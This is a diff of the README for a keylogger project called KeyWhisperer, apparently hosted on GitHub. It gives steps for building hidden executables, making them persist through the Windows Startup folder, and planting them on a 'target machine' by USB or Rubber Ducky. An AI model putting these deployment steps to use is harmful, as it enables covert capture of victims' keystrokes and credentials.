@@ -70,7 +70,7 @@ pyinstaller --onefile --noconsole startup.py
 This will copy the client.exe file to any derired location which can be edited in the [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py) file and create a shortcut to the client.exe file in the Windows Startup folder, ensuring that the keylogger runs every time the system starts.
 <br><br><br>
 
-## Execution:
+## Execution
 After generating the executable files, you will find the client.exe and startup.exe files within the dist folder created by PyInstaller.
 
 To deploy the keylogger on the target machine, transfer both files using an appropriate method, such as a USB flash drive, a Rubber Ducky, or another suitable technique.
@@ -88,8 +88,10 @@ You can create a script for Rubber Ducky using the following steps:
 3. Insert the Rubber Ducky into the target system and the payload script will automatically execute the startup.exe file. 
 <br>
 
-## Conclusion:
-As you embark on this journey of mastering the art of keylogging, remember that knowledge is power, but with great power comes great responsibility. Use this knowledge wisely to create a safer and more secure digital world. Happy keylogging!
+## Bugs, Issues and Contributing
+If you find bugs or have suggestions about improving the module, don't hesitate to contact me.
+<br><br><br>
 
-
-
+## License
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/BlurryFace04/KeyWhisperer/edit/main/LICENSE) file for details
+Copyright (c) 2023 Blurry Face
